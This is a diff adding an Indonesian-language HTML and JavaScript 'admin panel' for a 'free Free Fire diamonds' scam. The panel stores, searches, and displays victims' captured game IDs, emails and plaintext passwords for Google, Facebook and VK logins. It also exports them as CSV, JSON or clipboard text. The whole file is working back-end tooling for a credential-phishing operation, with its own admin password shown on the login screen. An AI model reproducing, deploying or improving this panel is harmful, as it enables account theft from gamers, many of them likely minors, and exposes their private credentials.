@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Diamond FF Gratis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: #1a1a2e;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Login Screen Styles */
+        .login-screen {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+        
+        .password-display {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 8px;
+            border: 1px solid #00ffff;
+        }
+        
+        .password-display code {
+            color: #ffd700;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            padding: 5px 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+        }
+        
+        .password-display p {
+            margin-top: 10px;
+            color: #90ff90;
+            font-size: 0.9rem;
+        }
+        
+        .login-form {
+            display: none;
+        }
+        
+        .login-form.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ffff;
+            font-weight: bold;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to right, #00ffff, #0080ff);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
+        }
+        
+        .login-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 5px;
+            border: 1px solid #ff6b6b;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        .attempts-warning {
+            color: #ffcc00;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+        
+        /* Admin Panel Styles (hidden until login) */
+        .admin-panel {
+            display: none;
+        }
+        
+        .admin-panel.active {
+            display: block;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ffff;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .admin-info {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .stat-box {
+            background: rgba(0, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #00ffff;
+            text-align: center;
+            min-width: 150px;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #00ffff;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: #90ffff;
+            margin-top: 5px;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .control-btn {
+            padding: 10px 20px;
+            background: rgba(0, 255, 255, 0.2);
+            border: 1px solid #00ffff;
+            color: #00ffff;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .control-btn:hover {
+            background: rgba(0, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        
+        .data-table th {
+            background: rgba(0, 255, 255, 0.2);
+            padding: 15px;
+            text-align: left;
+            border: 1px solid #00ffff;
+            color: #00ffff;
+            position: sticky;
+            top: 0;
+        }
+        
+        .data-table td {
+            padding: 12px 15px;
+            border: 1px solid #00ffff;
+            color: #cccccc;
+        }
+        
+        .data-table tr:nth-child(even) {
+            background: rgba(0, 255, 255, 0.05);
+        }
+        
+        .data-table tr:hover {
+            background: rgba(0, 255, 255, 0.1);
+        }
+        
+        .diamond-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            background: rgba(255, 215, 0, 0.2);
+            color: #ffd700;
+            border: 1px solid #ffd700;
+        }
+        
+        .login-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+        
+        .login-google { background: rgba(219, 68, 55, 0.2); color: #ff6b6b; border: 1px solid #ff6b6b; }
+        .login-facebook { background: rgba(59, 89, 152, 0.2); color: #6b9bff; border: 1px solid #6b9bff; }
+        .login-vk { background: rgba(76, 117, 163, 0.2); color: #7ba7ff; border: 1px solid #7ba7ff; }
+        .login-other { background: rgba(128, 128, 128, 0.2); color: #cccccc; border: 1px solid #cccccc; }
+        
+        .timestamp {
+            font-size: 0.85rem;
+            color: #90ffff;
+        }
+        
+        .password-cell {
+            font-family: 'Consolas', 'Courier New', monospace;
+            color: #ff6b6b;
+            font-weight: bold;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 5px;
+            border-radius: 3px;
+            text-align: center;
+        }
+        
+        .search-filter {
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid #00ffff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        
+        .search-box {
+            flex: 1;
+            min-width: 300px;
+        }
+        
+        .search-box input {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 5px;
+            color: #00ffff;
+        }
+        
+        .filter-select {
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 5px;
+            color: #00ffff;
+            min-width: 150px;
+        }
+        
+        .filter-select option {
+            background: #1a1a2e;
+            color: #00ffff;
+        }
+        
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .refresh-btn {
+            padding: 10px 20px;
+            background: rgba(0, 255, 255, 0.2);
+            border: 1px solid #00ffff;
+            color: #00ffff;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .refresh-btn:hover {
+            background: rgba(0, 255, 255, 0.3);
+        }
+        
+        .refresh-indicator {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #90ffff;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #90ffff;
+            font-size: 1.2rem;
+        }
+        
+        .export-section {
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid #00ffff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .export-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .export-btn {
+            padding: 12px 25px;
+            background: rgba(0, 255, 255, 0.2);
+            border: 1px solid #00ffff;
+            color: #00ffff;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .export-btn:hover {
+            background: rgba(0, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #90ffff;
+            font-size: 14px;
+            border-top: 1px solid #00ffff;
+            margin-top: 30px;
+        }
+        
+        @media (max-width: 768px) {
+            .admin-info {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .stats {
+                justify-content: center;
+            }
+            
+            .search-box {
+                min-width: 100%;
+            }
+            
+            .data-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div class="login-screen" id="loginScreen">
+        <div class="login-container">
+            <div class="login-header">
+                <h1>🔒 ADMIN PANEL</h1>
+                <p>Diamond FF Gratis - Administrator Access</p>
+            </div>
+            
+            <!-- Password Display -->
+            <div class="password-display">
+                <h3>Password Admin:</h3>
+                <code>everseID555</code>
+                <p>Gunakan password di atas untuk masuk ke admin panel</p>
+            </div>
+            
+            <div class="login-form active" id="passwordForm">
+                <div class="form-group">
+                    <label for="adminPassword">Masukkan Password:</label>
+                    <input type="password" id="adminPassword" placeholder="Ketik password di sini">
+                </div>
+                <button class="login-btn" onclick="checkPassword()">MASUK KE ADMIN PANEL</button>
+                <div class="error-message" id="errorMessage">Password salah! Coba lagi.</div>
+                <div class="attempts-warning" id="attemptsWarning"></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Admin Panel (Hidden until login) -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="container">
+            <header>
+                <h1>🛡️ ADMIN PANEL - DIAMOND FF GRATIS</h1>
+                <p>Monitoring System - Real-time Data Collection | <span id="userInfo"></span></p>
+            </header>
+            
+            <div class="admin-info">
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="stat-value" id="totalUsers">0</div>
+                        <div class="stat-label">Total Users</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="totalDiamonds">0</div>
+                        <div class="stat-label">Total Diamonds</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="todayUsers">0</div>
+                        <div class="stat-label">Hari Ini</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="lastUpdate">00:00:00</div>
+                        <div class="stat-label">Update Terakhir</div>
+                    </div>
+                </div>
+                
+                <div class="controls">
+                    <button class="control-btn" onclick="refreshData()">🔄 Refresh</button>
+                    <button class="control-btn" onclick="clearAllData()">🗑️ Clear All</button>
+                    <button class="control-btn" onclick="logout()">🚪 Logout</button>
+                </div>
+            </div>
+            
+            <div class="search-filter">
+                <div class="search-box">
+                    <input type="text" id="searchInput" placeholder="Cari berdasarkan ID, username, atau email..." onkeyup="filterData()">
+                </div>
+                
+                <select class="filter-select" id="diamondFilter" onchange="filterData()">
+                    <option value="">Semua Diamond</option>
+                    <option value="10">10 Diamond</option>
+                    <option value="80">80 Diamond</option>
+                    <option value="100">100 Diamond</option>
+                    <option value="500">500 Diamond</option>
+                    <option value="1000">1000 Diamond</option>
+                </select>
+                
+                <select class="filter-select" id="loginFilter" onchange="filterData()">
+                    <option value="">Semua Login</option>
+                    <option value="Google">Google</option>
+                    <option value="Facebook">Facebook</option>
+                    <option value="VK">VK</option>
+                    <option value="Lainnya">Lainnya</option>
+                </select>
+                
+                <div class="auto-refresh">
+                    <div class="refresh-indicator">
+                        <span id="refreshTimer">10</span> detik
+                        <span class="blink">●</span>
+                    </div>
+                    <button class="refresh-btn" onclick="toggleAutoRefresh()" id="autoRefreshBtn">⏸️ Pause</button>
+                </div>
+            </div>
+            
+            <table class="data-table" id="dataTable">
+                <thead>
+                    <tr>
+                        <th>No.</th>
+                        <th>ID FF</th>
+                        <th>Username</th>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>Login Method</th>
+                        <th>Diamond</th>
+                        <th>Waktu Submit</th>
+                        <th>Aksi</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <!-- Data akan dimuat di sini -->
+                </tbody>
+            </table>
+            
+            <div id="noDataMessage" class="no-data" style="display: none;">
+                <p>📭 Tidak ada data yang ditemukan.</p>
+                <p>Data akan muncul secara otomatis ketika user mengisi form diamond.</p>
+            </div>
+            
+            <div class="export-section">
+                <h3>📊 Ekspor Data</h3>
+                <div class="export-buttons">
+                    <button class="export-btn" onclick="exportToCSV()">📥 Export CSV</button>
+                    <button class="export-btn" onclick="exportToJSON()">📥 Export JSON</button>
+                    <button class="export-btn" onclick="copyAllData()">📋 Copy All Data</button>
+                    <button class="export-btn" onclick="showPasswords()">👁️ Tampilkan/Sembunyikan Password</button>
+                </div>
+            </div>
+            
+            <footer>
+                <p>⚠️ <strong>PERINGATAN:</strong> Panel ini hanya untuk monitoring. Data disimpan di localStorage browser.</p>
+                <p>© 2023 Admin Panel - Diamond FF Gratis | Login: <span id="loginTime"></span></p>
+            </footer>
+        </div>
+    </div>
+
+    <script>
+        // Password configuration
+        const ADMIN_PASSWORD = "everseID555";
+        const MAX_ATTEMPTS = 5;
+        const LOCKOUT_TIME = 300000; // 5 menit dalam milidetik
+        
+        let loginAttempts = 0;
+        let isLocked = false;
+        let lockoutEndTime = null;
+        let showPasswordsInTable = true; // Default password ditampilkan
+        
+        // Admin panel variables
+        let allData = [];
+        let filteredData = [];
+        let autoRefreshEnabled = true;
+        let refreshInterval;
+        let refreshCountdown = 10;
+        
+        // Initialize login check
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if already logged in from session
+            const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
+            const loginTime = localStorage.getItem('adminLoginTime');
+            
+            if (isLoggedIn && loginTime) {
+                // Check if session is still valid (8 hours)
+                const loginTimestamp = parseInt(loginTime);
+                const currentTime = new Date().getTime();
+                const sessionDuration = 8 * 60 * 60 * 1000; // 8 jam
+                
+                if (currentTime - loginTimestamp < sessionDuration) {
+                    showAdminPanel();
+                    return;
+                } else {
+                    localStorage.removeItem('adminLoggedIn');
+                    localStorage.removeItem('adminLoginTime');
+                }
+            }
+            
+            // Check for lockout
+            const lockoutTime = localStorage.getItem('adminLockout');
+            if (lockoutTime) {
+                const currentTime = new Date().getTime();
+                if (currentTime < parseInt(lockoutTime)) {
+                    isLocked = true;
+                    lockoutEndTime = parseInt(lockoutTime);
+                    updateLockoutDisplay();
+                } else {
+                    localStorage.removeItem('adminLockout');
+                    localStorage.removeItem('loginAttempts');
+                }
+            }
+            
+            // Get saved attempts
+            const savedAttempts = localStorage.getItem('loginAttempts');
+            if (savedAttempts) {
+                loginAttempts = parseInt(savedAttempts);
+                updateAttemptsWarning();
+            }
+            
+            // Setup enter key for password
+            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkPassword();
+                }
+            });
+            
+            // Show password toggle in input field
+            const passwordInput = document.getElementById('adminPassword');
+            const togglePasswordBtn = document.createElement('button');
+            togglePasswordBtn.type = 'button';
+            togglePasswordBtn.innerHTML = '👁️';
+            togglePasswordBtn.style.position = 'absolute';
+            togglePasswordBtn.style.right = '10px';
+            togglePasswordBtn.style.top = '50%';
+            togglePasswordBtn.style.transform = 'translateY(-50%)';
+            togglePasswordBtn.style.background = 'transparent';
+            togglePasswordBtn.style.border = 'none';
+            togglePasswordBtn.style.color = '#00ffff';
+            togglePasswordBtn.style.cursor = 'pointer';
+            togglePasswordBtn.style.fontSize = '16px';
+            
+            togglePasswordBtn.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    togglePasswordBtn.innerHTML = '👁️';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePasswordBtn.innerHTML = '👁️';
+                }
+            });
+            
+            // Add toggle button to password field
+            passwordInput.parentElement.style.position = 'relative';
+            passwordInput.parentElement.appendChild(togglePasswordBtn);
+        });
+        
+        // Check password function
+        function checkPassword() {
+            if (isLocked) {
+                showError("Akun terkunci! Tunggu 5 menit.");
+                return;
+            }
+            
+            const passwordInput = document.getElementById('adminPassword');
+            const password = passwordInput.value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (password === ADMIN_PASSWORD) {
+                // Successful login
+                loginAttempts = 0;
+                localStorage.removeItem('loginAttempts');
+                localStorage.removeItem('adminLockout');
+                
+                // Set login session
+                localStorage.setItem('adminLoggedIn', 'true');
+                localStorage.setItem('adminLoginTime', new Date().getTime().toString());
+                
+                showAdminPanel();
+            } else {
+                // Failed login
+                loginAttempts++;
+                localStorage.setItem('loginAttempts', loginAttempts.toString());
+                
+                if (loginAttempts >= MAX_ATTEMPTS) {
+                    // Lock account
+                    isLocked = true;
+                    lockoutEndTime = new Date().getTime() + LOCKOUT_TIME;
+                    localStorage.setItem('adminLockout', lockoutEndTime.toString());
+                    
+                    showError("Terlalu banyak percobaan! Akun terkunci selama 5 menit.");
+                    updateLockoutDisplay();
+                } else {
+                    const remaining = MAX_ATTEMPTS - loginAttempts;
+                    showError(`Password salah! Sisa percobaan: ${remaining}`);
+                    updateAttemptsWarning();
+                }
+                
+                // Clear password field
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                // Shake animation
+                errorMessage.classList.add('show');
+                setTimeout(() => {
+                    errorMessage.classList.remove('show');
+                }, 500);
+            }
+        }
+        
+        function updateAttemptsWarning() {
+            const attemptsWarning = document.getElementById('attemptsWarning');
+            const remaining = MAX_ATTEMPTS - loginAttempts;
+            
+            if (remaining <= 2 && remaining > 0) {
+                attemptsWarning.textContent = `Peringatan: ${remaining} percobaan tersisa sebelum terkunci!`;
+                attemptsWarning.style.display = 'block';
+            } else {
+                attemptsWarning.style.display = 'none';
+            }
+        }
+        
+        function updateLockoutDisplay() {
+            const errorMessage = document.getElementById('errorMessage');
+            const attemptsWarning = document.getElementById('attemptsWarning');
+            const loginBtn = document.querySelector('.login-btn');
+            
+            if (isLocked && lockoutEndTime) {
+                const currentTime = new Date().getTime();
+                const timeLeft = Math.ceil((lockoutEndTime - currentTime) / 1000);
+                
+                if (timeLeft > 0) {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    
+                    errorMessage.textContent = `Akun terkunci! Tunggu ${minutes}:${seconds.toString().padStart(2, '0')} menit.`;
+                    errorMessage.classList.add('show');
+                    
+                    attemptsWarning.textContent = `Terlalu banyak percobaan gagal`;
+                    attemptsWarning.style.display = 'block';
+                    
+                    loginBtn.disabled = true;
+                    loginBtn.textContent = "TERKUNCI";
+                    
+                    // Update countdown
+                    setTimeout(updateLockoutDisplay, 1000);
+                } else {
+                    // Lockout ended
+                    isLocked = false;
+                    lockoutEndTime = null;
+                    loginAttempts = 0;
+                    localStorage.removeItem('adminLockout');
+                    localStorage.removeItem('loginAttempts');
+                    
+                    errorMessage.classList.remove('show');
+                    attemptsWarning.style.display = 'none';
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = "MASUK KE ADMIN PANEL";
+                }
+            }
+        }
+        
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.classList.add('show');
+            
+            setTimeout(() => {
+                errorMessage.classList.remove('show');
+            }, 3000);
+        }
+        
+        function showAdminPanel() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('adminPanel').classList.add('active');
+            
+            // Show login info
+            const loginTime = new Date().toLocaleString();
+            document.getElementById('userInfo').textContent = `Admin | Login: ${loginTime}`;
+            document.getElementById('loginTime').textContent = loginTime;
+            
+            // Load admin data
+            loadData();
+            startAutoRefresh();
+            updateStats();
+            
+            // Update waktu terakhir
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+        }
+        
+        function logout() {
+            if (confirm('Apakah Anda yakin ingin logout?')) {
+                localStorage.removeItem('adminLoggedIn');
+                localStorage.removeItem('adminLoginTime');
+                location.reload();
+            }
+        }
+        
+        // Muat data dari localStorage
+        function loadData() {
+            const savedData = localStorage.getItem('adminData');
+            allData = savedData ? JSON.parse(savedData) : [];
+            allData.reverse(); // Tampilkan yang terbaru di atas
+            
+            filterData();
+        }
+        
+        // Filter data berdasarkan pencarian
+        function filterData() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const diamondFilter = document.getElementById('diamondFilter').value;
+            const loginFilter = document.getElementById('loginFilter').value;
+            
+            filteredData = allData.filter(item => {
+                const matchesSearch = !searchTerm || 
+                    item.id.toLowerCase().includes(searchTerm) ||
+                    (item.username && item.username.toLowerCase().includes(searchTerm)) ||
+                    (item.email && item.email.toLowerCase().includes(searchTerm));
+                
+                const matchesDiamond = !diamondFilter || item.diamondAmount === diamondFilter;
+                const matchesLogin = !loginFilter || item.loginMethod === loginFilter;
+                
+                return matchesSearch && matchesDiamond && matchesLogin;
+            });
+            
+            renderTable();
+            updateStats();
+        }
+        
+        // Render tabel data dengan password terlihat
+        function renderTable() {
+            const tableBody = document.getElementById('tableBody');
+            const noDataMessage = document.getElementById('noDataMessage');
+            
+            if (filteredData.length === 0) {
+                tableBody.innerHTML = '';
+                noDataMessage.style.display = 'block';
+                return;
+            }
+            
+            noDataMessage.style.display = 'none';
+            
+            let html = '';
+            filteredData.forEach((item, index) => {
+                // Tentukan class untuk login method
+                let loginClass = 'login-other';
+                if (item.loginMethod === 'Google') loginClass = 'login-google';
+                else if (item.loginMethod === 'Facebook') loginClass = 'login-facebook';
+                else if (item.loginMethod === 'VK') loginClass = 'login-vk';
+                
+                // Tampilkan password secara jelas
+                const passwordDisplay = showPasswordsInTable 
+                    ? `<div class="password-cell">${item.password || 'tidak ada'}</div>`
+                    : `<div class="password-cell">********</div>`;
+                
+                html += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td><strong>${item.id}</strong></td>
+                        <td>${item.username || '-'}</td>
+                        <td>${item.email || '-'}</td>
+                        <td>${passwordDisplay}</td>
+                        <td><span class="login-badge ${loginClass}">${item.loginMethod || '-'}</span></td>
+                        <td><span class="diamond-badge">${item.diamondAmount || '0'} 💎</span></td>
+                        <td class="timestamp">${item.timestamp || '-'}</td>
+                        <td>
+                            <button class="control-btn" onclick="deleteData(${allData.findIndex(d => d.timestamp === item.timestamp)})" style="padding: 5px 10px; font-size: 0.8rem;">Hapus</button>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            tableBody.innerHTML = html;
+        }
+        
+        // Update statistik
+        function updateStats() {
+            document.getElementById('totalUsers').textContent = allData.length;
+            
+            // Hitung total diamond
+            const totalDiamonds = allData.reduce((sum, item) => {
+                return sum + parseInt(item.diamondAmount || 0);
+            }, 0);
+            document.getElementById('totalDiamonds').textContent = totalDiamonds;
+            
+            // Hitung user hari ini
+            const today = new Date().toLocaleDateString();
+            const todayUsers = allData.filter(item => {
+                const itemDate = new Date(item.timestamp).toLocaleDateString();
+                return itemDate === today;
+            }).length;
+            document.getElementById('todayUsers').textContent = todayUsers;
+        }
+        
+        // Refresh data
+        function refreshData() {
+            loadData();
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+            resetRefreshTimer();
+        }
+        
+        // Hapus data tertentu
+        function deleteData(index) {
+            if (confirm('Apakah Anda yakin ingin menghapus data ini?')) {
+                allData.splice(index, 1);
+                saveData();
+                loadData();
+            }
+        }
+        
+        // Hapus semua data
+        function clearAllData() {
+            if (confirm('Yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
+                localStorage.removeItem('adminData');
+                allData = [];
+                filteredData = [];
+                renderTable();
+                updateStats();
+            }
+        }
+        
+        // Tampilkan/sembunyikan password
+        function showPasswords() {
+            showPasswordsInTable = !showPasswordsInTable;
+            renderTable();
+            
+            const btn = event.target;
+            if (showPasswordsInTable) {
+                btn.textContent = '🙈 Sembunyikan Password';
+            } else {
+                btn.textContent = '👁️ Tampilkan Password';
+            }
+        }
+        
+        // Simpan data ke localStorage
+        function saveData() {
+            localStorage.setItem('adminData', JSON.stringify(allData));
+        }
+        
+        // Auto-refresh system
+        function startAutoRefresh() {
+            refreshInterval = setInterval(() => {
+                if (autoRefreshEnabled) {
+                    refreshCountdown--;
+                    document.getElementById('refreshTimer').textContent = refreshCountdown;
+                    
+                    if (refreshCountdown <= 0) {
+                        refreshData();
+                        resetRefreshTimer();
+                    }
+                }
+            }, 1000);
+        }
+        
+        function resetRefreshTimer() {
+            refreshCountdown = 10;
+            document.getElementById('refreshTimer').textContent = refreshCountdown;
+        }
+        
+        function toggleAutoRefresh() {
+            autoRefreshEnabled = !autoRefreshEnabled;
+            const btn = document.getElementById('autoRefreshBtn');
+            
+            if (autoRefreshEnabled) {
+                btn.textContent = '⏸️ Pause';
+                btn.style.background = 'rgba(0, 255, 255, 0.2)';
+            } else {
+                btn.textContent = '▶️ Resume';
+                btn.style.background = 'rgba(255, 0, 0, 0.2)';
+            }
+        }
+        
+        // Ekspor data ke CSV dengan password terlihat
+        function exportToCSV() {
+            if (allData.length === 0) {
+                alert('Tidak ada data untuk diekspor!');
+                return;
+            }
+            
+            const headers = ['ID FF', 'Username', 'Email', 'Password', 'Login Method', 'Diamond', 'Timestamp'];
+            const csvRows = [
+                headers.join(','),
+                ...allData.map(item => [
+                    item.id,
+                    `"${item.username || ''}"`,
+                    item.email || '',
+                    item.password || '',
+                    item.loginMethod || '',
+                    item.diamondAmount || '',
+                    `"${item.timestamp || ''}"`
+                ].join(','))
+            ];
+            
+            const csvString = csvRows.join('\n');
+            const blob = new Blob([csvString], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `diamond_ff_data_${new Date().toISOString().slice(0,10)}.csv`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // Ekspor data ke JSON dengan password terlihat
+        function exportToJSON() {
+            if (allData.length === 0) {
+                alert('Tidak ada data untuk diekspor!');
+                return;
+            }
+            
+            const jsonString = JSON.stringify(allData, null, 2);
+            const blob = new Blob([jsonString], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `diamond_ff_data_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // Copy semua data ke clipboard dengan password terlihat
+        function copyAllData() {
+            if (allData.length === 0) {
+                alert('Tidak ada data untuk disalin!');
+                return;
+            }
+            
+            const text = allData.map((item, index) => {
+                return `${index + 1}. ID: ${item.id} | User: ${item.username || '-'} | Email: ${item.email || '-'} | Password: ${item.password || 'tidak ada'} | Diamond: ${item.diamondAmount || '0'} | Login: ${item.loginMethod || '-'} | Waktu: ${item.timestamp || '-'}`;
+            }).join('\n\n');
+            
+            navigator.clipboard.writeText(text)
+                .then(() => alert('Semua data berhasil disalin ke clipboard!\n\nPassword juga ditampilkan dalam data yang disalin.'))
+                .catch(() => alert('Gagal menyalin data ke clipboard.'));
+        }
+    </script>
+</body>
+</html>
